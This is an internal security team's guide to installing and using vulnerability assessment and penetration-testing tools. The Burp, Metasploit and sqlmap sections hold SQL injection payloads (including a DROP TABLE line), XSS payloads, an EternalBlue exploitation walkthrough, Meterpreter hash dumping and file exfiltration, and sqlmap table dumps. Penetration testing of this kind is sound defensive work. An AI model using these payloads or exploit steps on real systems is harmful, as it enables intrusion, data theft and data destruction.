# VAPT Tools Implementation & Testing Guide
**Document Control**
- **Version**: 1.0.0
- **Effective Date**: December 15, 2025
- **Document Owner**: IT Security Manager
- **Classification**: Internal - Technical

---

## Overview

This guide provides step-by-step implementation and testing instructions for all tools referenced in the VAPT program framework.

**Tool Categories**:
1. Vulnerability Scanners
2. Web Application Testing
3. Network Discovery & Enumeration
4. Exploitation Frameworks
5. Cloud Security Assessment
6. Container & Kubernetes Security
7. Code Analysis (SAST/DAST)
8. Database & Infrastructure
9. Collaboration & Reporting

---

## 1. Vulnerability Scanners

### 1.1 Tenable Nessus Professional

**Purpose**: Automated vulnerability scanning for networks, systems, and applications

**Installation (Ubuntu 22.04)**:

```bash
# Download Nessus (get latest version from tenable.com)
wget https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.x.x-ubuntu1404_amd64.deb

# Install
sudo dpkg -i Nessus-10.x.x-ubuntu1404_amd64.deb

# Start service
sudo systemctl start nessusd
sudo systemctl enable nessusd

# Access web interface (wait 3-5 minutes for initialization)
# URL: https://localhost:8834
```

**Initial Setup**:
1. Navigate to `https://<server-ip>:8834`
2. Create admin account
3. Enter activation code (from Tenable license)
4. Wait for plugin compilation (~30 minutes)

**Configuration Steps**:

```bash
# 1. Create scan policy
# Web UI: Settings → Policies → New Policy
# Select: Basic Network Scan (or Advanced Scan for custom)

# 2. Configure credentials for authenticated scanning
# Settings → Credentials
# Add SSH credentials (Linux):
#   - Username: scanner_user
#   - SSH Keys or Password
#   - Elevate privileges: sudo

# Add Windows credentials:
#   - Username: DOMAIN\scanner_user
#   - Password: <password>
#   - Auth method: NTLM

# 3. Create scan targets
# Scans → New Scan
#   - Template: Basic Network Scan
#   - Name: "Weekly Internal Scan - Production"
#   - Targets: 10.0.20.0/24 (or import from CSV)
#   - Schedule: Weekly, Sunday 02:00 AM
#   - Credentials: Select created credentials
```

**Testing - First Vulnerability Scan**:

```bash
# Step 1: Create test scan
# Target: Single test system (e.g., 10.0.20.10)
# Policy: Basic Network Scan
# Scan NOW (not scheduled)

# Step 2: Monitor scan progress
# Scans tab → Click scan name → View progress
# Wait for completion (15-60 minutes depending on target)

# Step 3: Review results
# Click completed scan
# Review vulnerabilities by severity:
#   - Critical (red)
#   - High (orange)
#   - Medium (yellow)
#   - Low (blue)
#   - Info (gray)

# Step 4: Export results
# Click "Export" → Select format:
#   - PDF (for management)
#   - CSV (for database import)
#   - Nessus (for archival)

# Step 5: Validate findings (check for false positives)
# Pick 2-3 Critical/High findings
# Manually verify (SSH to host, check version)
# Example:
ssh user@10.0.20.10
cat /etc/os-release  # Check OS version
apache2 -v           # Check Apache version (if vulnerability is Apache-related)
```

**API Integration** (Export to Findings Database):

```python
#!/usr/bin/env python3
# nessus_export.py - Export scan results to PostgreSQL

import requests
import json
import psycopg2

NESSUS_URL = "https://nessus.internal:8834"
API_KEYS = {"X-ApiKeys": "accessKey=YOUR_ACCESS_KEY; secretKey=YOUR_SECRET_KEY"}

# Get scan results
response = requests.get(f"{NESSUS_URL}/scans/{scan_id}", headers=API_KEYS, verify=False)
scan_data = response.json()

# Parse vulnerabilities
for vuln in scan_data['vulnerabilities']:
    if vuln['severity'] >= 3:  # High or Critical
        # Insert into findings database
        conn = psycopg2.connect("dbname=vapt user=vapt_user password=xxx")
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO findings (vulnerability_title, cve_id, cvss_base_score, 
                                  severity, asset_id, discovered_by)
            VALUES (%s, %s, %s, %s, %s, %s)
        """, (vuln['plugin_name'], vuln.get('cve'), vuln.get('cvss_base_score'),
              'Critical' if vuln['severity'] == 4 else 'High', 
              find_asset_id(vuln['asset']), 'Nessus'))
        conn.commit()
```

---

### 1.2 Qualys VMDR (Cloud)

**Purpose**: Cloud-based vulnerability management and detection/response

**Setup** (SaaS - No installation):

```bash
# 1. Sign up for Qualys account (qualys.com)
# 2. Deploy cloud agents on endpoints

# Linux agent installation:
curl -o QualysCloudAgent.rpm https://[qualys-portal]/CloudAgent.rpm
sudo rpm -i QualysCloudAgent.rpm

# Activate agent:
sudo /usr/local/qualys/cloud-agent/bin/qualys-cloud-agent.sh ActivationId=XXXXX CustomerId=YYYYY
    
# Windows agent (PowerShell as Admin):
# Download from Qualys portal, install MSI
# Activate via GUI or command line

# 3. Configure scanning policies
# Qualys Web UI → Scans → Option Profiles
# Create new: "Production Weekly Scan"
#   - Scan Type: Authenticated
#   - Ports: Standard (1-65535 or custom)
#   - Detection: Confirmed vulnerabilities only (reduce FP)
```

**Testing - Cloud Scan**:

```bash
# Step 1: Create scan
# Scans → New Scan
#   - Title: Test Scan - Web Server
#   - Asset: Single IP or asset group
#   - Option Profile: Production Weekly Scan
#   - Launch: Now

# Step 2: Monitor
# View active scans in dashboard
# Typical scan: 20-40 minutes

# Step 3: Review results
# Reports → Scan Results
# Filter by severity
# Export to CSV/PDF

# Step 4: API integration
# Use Qualys API to fetch results
curl -u "username:password" \
  "https://qualysapi.qualys.com/api/2.0/fo/scan/results/?scan_ref=scan/12345" \
  -o qualys_results.xml
```

---

### 1.3 OpenVAS (Open Source Alternative)

**Installation** (Docker - Easiest Method):

```bash
# Install Docker
sudo apt update && sudo apt install -y docker.io docker-compose

# Pull OpenVAS (via Greenbone Community Edition)
sudo docker pull greenbone/openvas

# Run OpenVAS container
sudo docker run -d -p 443:443 --name openvas greenbone/openvas

# Wait for initialization (10-15 minutes)
# Get admin password:
sudo docker logs openvas 2>&1 | grep "admin user password"

# Access: https://localhost:443
# Login: admin / <generated-password>
```

**Testing with OpenVAS**:

```bash
# Step 1: Create target
# Configuration → Targets → New Target
#   - Name: Test Server
#   - Hosts: 192.168.1.100

# Step 2: Create task
# Scans → Tasks → New Task
#   - Name: First Scan
#   - Scan Targets: Test Server
#   - Scanner: OpenVAS Default
#   - Start: Immediately

# Step 3: Monitor and review
# Dashboard → View active tasks
# When complete: View report
```

---

## 2. Web Application Testing Tools

### 2.1 Burp Suite Professional

**Installation** (All platforms):

```bash
# Download from portswigger.net
# Linux:
chmod +x burpsuite_pro_linux_v2023_x_x.sh
./burpsuite_pro_linux_v2023_x_x.sh

# Activate license (requires purchase)
# Help → Burp → License activation

# Windows/Mac: Run installer
```

**Configuration**:

```bash
# 1. Configure browser proxy
# Firefox Settings → Network Settings → Manual Proxy
#   - HTTP Proxy: 127.0.0.1
#   - Port: 8080
#   - Use for HTTPS: checked

# 2. Install Burp CA Certificate
# Browser: Navigate to http://burp
# Click "CA Certificate" → Save
# Firefox: Settings → Privacy & Security → Certificates → Import
# Import burp certificate, check "Trust for websites"

# 3. Configure Burp scope
# Target → Scope → Add
#   - Protocol: HTTPS
#   - Host: example.com
#   - File: ^/.*$ (regex for all paths)
```

**Step-by-Step Web App Testing**:

**Test 1: SQL Injection Detection**

```bash
# Step 1: Spider the application
# Target → Site map → Right-click target → Spider this host
# Wait for completion

# Step 2: Active Scan
# Right-click target in site map → Scan → Active scan
# Check: SQL Injection in scan configuration
# Start scan

# Step 3: Manual testing (example: login form)
# Intercept login request (Proxy → Intercept ON)
# Modify parameter:
#   Original: username=admin&password=test123
#   Modified: username=admin' OR '1'='1&password=test123
# Forward request
# Observe response (if login succeeds = SQLi vulnerability)

# Step 4: Use Intruder for automated testing
# Send request to Intruder (Ctrl+I)
# Positions → Clear § → Add §username§ parameter
# Payloads → Load SQL injection payload list:
#   ' OR '1'='1
#   '; DROP TABLE users--
#   admin'--
# Start attack
# Analyze responses for anomalies
```

**Test 2: Cross-Site Scripting (XSS)**

```bash
# Step 1: Identify input fields
# Browse application, note all forms

# Step 2: Test reflected XSS
# Input field: <script>alert('XSS')</script>
# Submit form
# If popup appears = XSS vulnerability

# Step 3: Use Burp Scanner (automated)
# Right-click request → Scan → Active scan
# Select XSS checks only
# Review results in "Issues" tab

# Step 4: Validate finding
# Reproduce manually
# Try bypasses if filtered:
#   <img src=x onerror=alert('XSS')>
#   <svg onload=alert('XSS')>
```

**Reporting**:

```bash
# Target → Site map → Right-click target → Issues → Report issues
# Select format: HTML (detailed) or XML (for import)
# Include: All issues or Critical/High only
# Generate report → Save
```

---

### 2.2 OWASP ZAP (Free Alternative)

**Installation**:

```bash
# Linux (Snap):
sudo snap install zaproxy --classic

# Or download from zaproxy.org
wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2.14.0_Linux.tar.gz
tar -xvf ZAP_2.14.0_Linux.tar.gz
cd ZAP_2.14.0
./zap.sh
```

**Automated Scan** (Headless for CI/CD):

```bash
# Docker-based automated scan
docker run -v $(pwd):/zap/wrk/:rw \
  -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py \
  -t https://example.com \
  -r zap_report.html

# Baseline scan: Passive checks only (safe for production)
# Full scan: Active checks (more thorough, potentially disruptive)
docker run -v $(pwd):/zap/wrk/:rw \
  -t ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py \
  -t https://example.com \
  -r zap_full_report.html
```

**CI/CD Integration** (Jenkins/GitLab):

```yaml
# .gitlab-ci.yml
zap_scan:
  stage: security
  image: ghcr.io/zaproxy/zaproxy:stable
  script:
    - zap-baseline.py -t $TARGET_URL -r zap_report.html
  artifacts:
    paths:
      - zap_report.html
    expire_in: 7 days
  allow_failure: true  # Don't block pipeline, but report
```

---

## 3. Network Discovery & Enumeration

### 3.1 Nmap

**Installation**:

```bash
# Linux
sudo apt install nmap

# Verify
nmap --version
```

**Step-by-Step Network Scanning**:

**Scan 1: Host Discovery**

```bash
# Discover live hosts in subnet
nmap -sn 192.168.1.0/24

# Output shows live hosts
# Example:
# Nmap scan report for 192.168.1.10
# Host is up (0.0012s latency).
```

**Scan 2: Port Scanning**

```bash
# Scan top 1000 ports (fast)
nmap 192.168.1.10

# Scan all 65535 ports (thorough, slow)
nmap -p- 192.168.1.10

# Scan specific ports
nmap -p 22,80,443,3306 192.168.1.10
```

**Scan 3: Service Version Detection**

```bash
# Detect service versions
nmap -sV 192.168.1.10

# Example output:
# PORT    STATE SERVICE VERSION
# 22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
# 80/tcp  open  http    Apache httpd 2.4.41
# 3306/tcp open mysql  MySQL 8.0.32
```

**Scan 4: OS Detection**

```bash
# Detect operating system
sudo nmap -O 192.168.1.10

# Example output:
# OS details: Linux 5.4 - 5.10
```

**Scan 5: Vulnerability Scripts**

```bash
# Run NSE (Nmap Scripting Engine) vulnerability checks
nmap --script vuln 192.168.1.10

# Specific script (e.g., check for MS17-010 - EternalBlue)
nmap --script smb-vuln-ms17-010 192.168.1.10

# List available scripts:
ls /usr/share/nmap/scripts/ | grep -i vuln
```

**Full Scan for Pentest**:

```bash
# Comprehensive scan
sudo nmap -sS -sV -O -A -p- -T4 \
  --script=default,vuln \
  -oA full_scan_$(date +%Y%m%d) \
  192.168.1.10

# Flags explained:
# -sS: SYN scan (stealth)
# -sV: Service version detection
# -O: OS detection
# -A: Aggressive (OS, version, script, traceroute)
# -p-: All ports
# -T4: Timing (faster, noisier)
# --script: Run scripts
# -oA: Output all formats (nmap, XML, grepable)
```

---

### 3.2 Masscan

**Installation**:

```bash
sudo apt install masscan

# Or compile from source:
git clone https://github.com/robertdavidgraham/masscan
cd masscan
make
sudo make install
```

**Usage** (Fast Port Scanning):

```bash
# Scan entire Class B network for port 80 (very fast!)
sudo masscan 10.0.0.0/16 -p80 --rate=100000

# Scan multiple ports
sudo masscan 192.168.1.0/24 -p22,80,443,3306,8080 --rate=10000

# Output to file
sudo masscan 10.0.0.0/16 -p1-65535 --rate=100000 -oL masscan_results.txt
```

---

## 4. Exploitation Frameworks

### 4.1 Metasploit Framework

**Installation** (Kali Linux - pre-installed):

```bash
# Update Metasploit
sudo apt update
sudo apt install metasploit-framework

# Or on Ubuntu:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall
```

**Step-by-Step Exploitation Example**:

**Scenario: Exploit EternalBlue (MS17-010) - Lab Environment Only**

```bash
# Step 1: Start Metasploit
msfconsole

# Step 2: Search for exploit
msf6 > search ms17-010

# Step 3: Use exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Step 4: Show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Step 5: Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50  # Attacker IP

# Step 6: Check if target is vulnerable
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

# Step 7: Run exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

# If successful, you get a Meterpreter session
meterpreter > sysinfo
meterpreter > getuid
meterpreter > screenshot
meterpreter > exit
```

**Safe Testing with Metasploitable**:

```bash
# Download Metasploitable 2 (intentionally vulnerable VM)
# From: https://sourceforge.net/projects/metasploitable/

# Import to VirtualBox/VMware
# Network: Host-only or Internal (isolated)

# Example exploit: VSFTPd Backdoor
msfconsole
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS <metasploitable-ip>
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

**Post-Exploitation** (After getting shell):

```bash
# Meterpreter commands
meterpreter > sysinfo           # System information
meterpreter > getuid            # Current user
meterpreter > ps                # Process list
meterpreter > hashdump          # Dump password hashes (Windows)
meterpreter > screenshot        # Take screenshot
meterpreter > download /etc/passwd /tmp/  # Exfiltrate file
meterpreter > shell             # Drop to OS shell
```

---

## 5. Cloud Security Assessment Tools

### 5.1 Prowler (AWS Security Best Practices)

**Installation**:

```bash
# Install Prowler
pip3 install prowler-cloud

# Or via Git:
git clone https://github.com/prowler-cloud/prowler
cd prowler
pip install -r requirements.txt
```

**AWS Configuration**:

```bash
# Configure AWS CLI credentials
aws configure
# Enter:
#   AWS Access Key ID
#   AWS Secret Access Key
#   Default region: us-east-1
#   Output format: json

# Or use IAM role (recommended for EC2-based scanning)
# Attach SecurityAudit policy to instance role
```

**Running Prowler Scan**:

```bash
# Basic scan (all checks)
prowler aws

# Scan specific service (e.g., S3 only)
prowler aws --services s3

# Scan with specific compliance framework (CIS AWS Benchmark)
prowler aws --compliance cis_1.5_aws

# Output to JSON for parsing
prowler aws --output-formats json html csv
# Generates:
#   prowler-output-123456-*.json
#   prowler-output-123456-*.html
#   prowler-output-123456-*.csv

# Check only Critical/High severity
prowler aws --severity critical high
```

**Example Findings**:

```bash
# Sample output:
# [FAIL] S3.1: Check if S3 buckets have public access block enabled
# [PASS] IAM.4: Ensure no root account access key exists
# [FAIL] EC2.8: EC2 instances should use IMDSv2

# Remediation:
# For S3.1: Enable public access block
aws s3api put-public-access-block \
    --bucket my-bucket \
    --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
```

---

### 5.2 ScoutSuite (Multi-Cloud)

**Installation**:

```bash
pip install scoutsuite

# Or via Docker:
docker pull rossja/scoutsuite
```

**Scanning AWS**:

```bash
# Scan with default credentials (~/.aws/credentials)
scout aws

# Scan with profile
scout aws --profile production

# Output to custom directory
scout aws --report-dir /tmp/aws-audit-2025-12-15
```

**Scanning Azure**:

```bash
# Login to Azure
az login

# Run ScoutSuite
scout azure --cli

# Or with service principal:
scout azure --tenant <tenant-id> \
            --subscription <subscription-id> \
            --client-id <app-id> \
            --client-secret <secret>
```

**Scanning GCP**:

```bash
# Authenticate
gcloud auth application-default login

# Run ScoutSuite
scout gcp --project-id <project-id>

# Scan all projects in organization
scout gcp --organization-id <org-id>
```

**Reviewing Results**:

```bash
# Open HTML report (generated in scoutsuite-report/)
cd scoutsuite-report
python3 -m http.server 8000
# Navigate to: http://localhost:8000

# Review findings by service (IAM, EC2, S3, etc.)
# Prioritize: High/Critical issues first
```

---

## 6. Container & Kubernetes Security

### 6.1 Trivy (Container Image Scanning)

**Installation**:

```bash
# Linux (Debian/Ubuntu)
sudo apt-get install wget apt-transport-https gnupg lsb-release
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
sudo apt-get update
sudo apt-get install trivy
```

**Scanning Container Images**:

```bash
# Scan local image
trivy image nginx:latest

# Scan image from registry
trivy image python:3.9-alpine

# Scan for specific severity
trivy image --severity HIGH,CRITICAL nginx:latest

# Output to JSON
trivy image -f json -o results.json nginx:latest

# Scan Dockerfile
trivy config Dockerfile
```

**CI/CD Integration** (GitLab):

```yaml
# .gitlab-ci.yml
container_scan:
  stage: test
  image:
    name: aquasec/trivy:latest
    entrypoint: [""]
  script:
    - trivy image --exit-code 1 --severity CRITICAL $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  only:
    - merge_requests
```

---

### 6.2 kube-bench (Kubernetes CIS Benchmark)

**Installation**:

```bash
# Run as Job in Kubernetes cluster
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml

# View results
kubectl logs job/kube-bench

# Or download binary:
curl -L https://github.com/aquasecurity/kube-bench/releases/download/v0.6.15/kube-bench_0.6.15_linux_amd64.tar.gz -o kube-bench.tar.gz
tar -xvf kube-bench.tar.gz
./kube-bench
```

**Running Check**:

```bash
# Check master node
./kube-bench master

# Check worker nodes
./kube-bench node

# Output to JSON
./kube-bench --json > kube-bench-results.json
```

**Sample Findings & Remediation**:

```bash
# Finding: 1.2.1 Ensure that the --anonymous-auth argument is set to false (Scored)
# Remediation:
# Edit /etc/kubernetes/manifests/kube-apiserver.yaml
# Add: --anonymous-auth=false

# Finding: 4.2.1 Ensure that the --profiling argument is set to false
# Remediation:
# Edit kubelet config
# Add: --profiling=false
```

---

## 7. Code Analysis (SAST/DAST)

### 7.1 SonarQube (SAST)

**Installation** (Docker Compose):

```yaml
# docker-compose.yml
version: "3"
services:
  sonarqube:
    image: sonarqube:community
    ports:
      - "9000:9000"
    environment:
      - SONAR_JDBC_URL=jdbc:postgresql://db:5432/sonar
      - SONAR_JDBC_USERNAME=sonar
      - SONAR_JDBC_PASSWORD=sonar
    volumes:
      - sonarqube_data:/opt/sonarqube/data
      - sonarqube_extensions:/opt/sonarqube/extensions
      - sonarqube_logs:/opt/sonarqube/logs
  db:
    image: postgres:12
    environment:
      - POSTGRES_USER=sonar
      - POSTGRES_PASSWORD=sonar
    volumes:
      - postgresql:/var/lib/postgresql
      - postgresql_data:/var/lib/postgresql/data
volumes:
  sonarqube_data:
  sonarqube_extensions:
  sonarqube_logs:
  postgresql:
  postgresql_data:
```

```bash
# Start SonarQube
docker-compose up -d

# Access: http://localhost:9000
# Default credentials: admin / admin
```

**Scanning a Project**:

```bash
# Install SonarScanner
wget https://binaries.sonarsource.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-4.7.0.2747-linux.zip
unzip sonar-scanner-cli-4.7.0.2747-linux.zip
export PATH=$PATH:$(pwd)/sonar-scanner-4.7.0.2747-linux/bin

# Create sonar-project.properties in project root:
cat > sonar-project.properties << EOF
sonar.projectKey=my-project
sonar.projectName=My Project
sonar.projectVersion=1.0
sonar.sources=.
sonar.sourceEncoding=UTF-8
sonar.host.url=http://localhost:9000
sonar.login=<token>
EOF

# Generate token in SonarQube:
# UI: My Account → Security → Generate Token

# Run scan:
sonar-scanner
```

**Reviewing Results**:

```bash
# Navigate to http://localhost:9000
# Click project
# Review:
#   - Bugs (code defects)
#   - Vulnerabilities (security issues)
#   - Code Smells (maintainability issues)
#   - Coverage (test coverage %)
#   - Duplications

# Filter by severity:
#   - Blocker
#   - Critical
#   - Major
#   - Minor
```

---

### 7.2 Semgrep (Lightweight SAST)

**Installation**:

```bash
pip install semgrep
```

**Scanning**:

```bash
# Scan current directory with default rules
semgrep --config=auto .

# Scan for specific issue (e.g., SQL injection)
semgrep --config "p/sql-injection" .

# Scan with OWASP Top 10 rules
semgrep --config "p/owasp-top-ten" .

# Output to JSON
semgrep --config=auto --json -o results.json .
```

**CI/CD Integration**:

```bash
# GitHub Actions (.github/workflows/semgrep.yml)
name: Semgrep
on: [pull_request]
jobs:
  semgrep:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/secrets
```

---

## 8. Database & Reporting

### 8.1 PostgreSQL (Findings Database)

**Installation**:

```bash
# Ubuntu/Debian
sudo apt install postgresql postgresql-contrib

# Start service
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Create database and user
sudo -u postgres psql
postgres=# CREATE DATABASE vapt;
postgres=# CREATE USER vapt_user WITH PASSWORD 'secure_password';
postgres=# GRANT ALL PRIVILEGES ON DATABASE vapt TO vapt_user;
postgres=# \q
```

**Import Findings Schema**:

```bash
# Copy schema from Findings-Database-Schema.md

# Create schema file
cat > findings_schema.sql << 'EOF'
CREATE TABLE findings (
  finding_id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  asset_id UUID NOT NULL,
  vulnerability_title VARCHAR(500) NOT NULL,
  cve_id VARCHAR(50),
  cvss_base_score DECIMAL(3,1),
  severity VARCHAR(20),
  -- ... (rest of schema from document)
);

CREATE TABLE test_reports (
  -- ... (from schema doc)
);

-- Create indexes
CREATE INDEX idx_findings_asset_id ON findings(asset_id);
CREATE INDEX idx_findings_severity ON findings(severity);
-- ...
EOF

# Import schema
psql -U vapt_user -d vapt -f findings_schema.sql
```

**Insert Test Finding**:

```sql
-- Connect to database
psql -U vapt_user -d vapt

-- Insert sample finding
INSERT INTO findings (
  vulnerability_title, cve_id, cvss_base_score, severity,
  description, remediation_recommendation, discovered_by
) VALUES (
  'SQL Injection in /api/users endpoint',
  'N/A',
  9.8,
  'Critical',
  'Unauthenticated SQL injection allows database access',
  'Use parameterized queries. Example: cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))',
  'Manual Pentest - John Doe'
);

-- Query findings
SELECT finding_id, vulnerability_title, severity, cvss_base_score
FROM findings
WHERE severity = 'Critical'
ORDER BY discovered_date DESC;
```

---

### 8.2 Grafana (Dashboards)

**Installation** (Docker):

```bash
docker run -d \
  -p 3000:3000 \
  --name=grafana \
  -v grafana-storage:/var/lib/grafana \
  grafana/grafana-oss

# Access: http://localhost:3000
# Default credentials: admin / admin
```

**Configure PostgreSQL Data Source**:

```bash
# UI: Configuration → Data Sources → Add PostgreSQL
# Settings:
#   Host: findings-db.internal:5432
#   Database: vapt
#   User: vapt_user
#   Password: <password>
#   SSL Mode: require
#   Version: 15+
```

**Create Dashboard**:

```sql
-- Example query for panel: "Open Critical Vulnerabilities"
SELECT COUNT(*) AS critical_count
FROM findings
WHERE severity = 'Critical'
  AND status IN ('New', 'In Progress');

-- Query for "Vulnerability Trend (Last 90 Days)"
SELECT
  DATE(discovered_date) AS day,
  severity,
  COUNT(*) AS count
FROM findings
WHERE discovered_date >= NOW() - INTERVAL '90 days'
GROUP BY DATE(discovered_date), severity
ORDER BY day;
```

---

## 9. Collaboration & Reporting Tools

### 9.1 Faraday (Pentest Collaboration)

**Installation** (Docker):

```bash
# Clone repository
git clone https://github.com/infobyte/faraday.git
cd faraday

# Start with Docker Compose
docker-compose up -d

# Access: http://localhost:5985
# Default credentials: faraday / changeme
```

**Creating Workspace**:

```bash
# UI: Workspaces → New Workspace
# Name: Q4-2025-External-Pentest
# Description: Annual external penetration test
# Start/End dates: Set schedule
```

**Importing Tool Results**:

```bash
# Import Nmap scan
# Upload: nmap_scan.xml

# Import Nessus scan
# Upload: nessus_export.nessus

# Import Burp Suite
# Upload: burp_issues.xml

# All findings aggregated in single workspace
```

---

## 10. Complete Testing Workflow Example

### Scenario: Web Application Penetration Test

**Target**: https://demo-app.example.com

**Step 1: Reconnaissance** (15 minutes)

```bash
# DNS enumeration
nslookup demo-app.example.com
whois example.com

# Subdomain discovery
sublist3r -d example.com -o subdomains.txt

# Technology fingerprinting
whatweb https://demo-app.example.com
```

**Step 2: Vulnerability Scanning** (30 minutes)

```bash
# Nessus web app scan
# Create scan targeting https://demo-app.example.com
# Use "Web App Tests" policy

# Or Nikto (quick alternative)
nikto -h https://demo-app.example.com -o nikto_results.html -Format html
```

**Step 3: Manual Testing with Burp Suite** (2-3 hours)

```bash
# 1. Configure proxy
# 2. Browse application (spider)
# 3. Run active scan
# 4. Manual injection testing:
#    - SQL injection (all input fields)
#    - XSS (search boxes, comments)
#    - IDOR (change user IDs in URLs)
#    - CSRF (test state-changing requests)
```

**Step 4: Exploitation** (If findings exist, 1-2 hours)

```bash
# Example: Confirmed SQLi
# Use sqlmap for automated exploitation
sqlmap -u "https://demo-app.example.com/product?id=1" \
       --dbms=mysql \
       --batch \
       --dbs  # List databases

# Extract data (proof-of-concept only!)
sqlmap -u "https://demo-app.example.com/product?id=1" \
       -D webapp_db \
       -T users \
       --dump \
       --stop=10  # Limit to 10 rows for PoC
```

**Step 5: Reporting** (2-3 hours)

```bash
# 1. Export from Burp Suite (HTML report)
# 2. Screenshot all findings
# 3. Write report sections:
#    - Executive Summary
#    - Methodology
#    - Findings (per vulnerability with CVSS)
#    - Remediation recommendations
# 4. Deliver: PDF + supporting evidence
```

---

## Tool Summary Reference

| Tool | Category | Free/Paid | Difficulty | Use Case |
|------|----------|-----------|------------|----------|
| **Nessus** | Vulnerability Scanner | Paid | Easy | Automated network/system scanning |
| **Qualys** | Vulnerability Scanner | Paid (Cloud) | Easy | Enterprise cloud-based scanning |
| **OpenVAS** | Vulnerability Scanner | Free | Medium | Open-source alternative to Nessus |
| **Burp Suite Pro** | Web App Testing | Paid | Medium | Manual web app pentesting |
| **OWASP ZAP** | Web App Testing | Free | Easy | Automated web app scanning |
| **Nmap** | Network Discovery | Free | Easy | Port scanning, service detection |
| **Masscan** | Network Discovery | Free | Easy | Ultra-fast port scanning |
| **Metasploit** | Exploitation | Free (CE), Paid (Pro) | Hard | Exploit development & testing |
| **Prowler** | Cloud Security | Free | Easy | AWS security assessment |
| **ScoutSuite** | Cloud Security | Free | Easy | Multi-cloud security auditing |
| **Trivy** | Container Security | Free | Easy | Docker image vulnerability scanning |
| **kube-bench** | K8s Security | Free | Easy | Kubernetes CIS compliance |
| **SonarQube** | SAST | Free (CE), Paid (EE) | Medium | Static code analysis |
| **Semgrep** | SAST | Free | Easy | Lightweight pattern-based SAST |
| **PostgreSQL** | Database | Free | Medium | Findings database |
| **Grafana** | Visualization | Free (OSS), Paid (Cloud) | Medium | Metrics dashboards |
| **Faraday** | Pentest Platform | Free (CE), Paid (Pro) | Medium | Multi-tester collaboration |

---

## Next Steps

1. **Start Small**: Deploy Nessus + Nmap for basic scanning
2. **Build Skills**: Practice on intentionally vulnerable VMs (Metasploitable, DVWA, WebGoat)
3. **Automate**: Integrate tools into CI/CD pipelines
4. **Scale**: Deploy full infrastructure per Architecture document
5. **Train Team**: Certifications (OSCP, CEH, GPEN) for advanced exploitation

---

## Related Documents

- [Methodology Framework](../01-policy-governance/Methodology-Framework.md)
- [Testing Schedule Matrix](../02-vapt-scope-inventory/Testing-Schedule-Matrix.md)
- [Infrastructure Architecture](../04-data-infrastructure/Infrastructure-Architecture.md)

---

*Document Version: 1.0.0 | Last Updated: 2025-12-15*
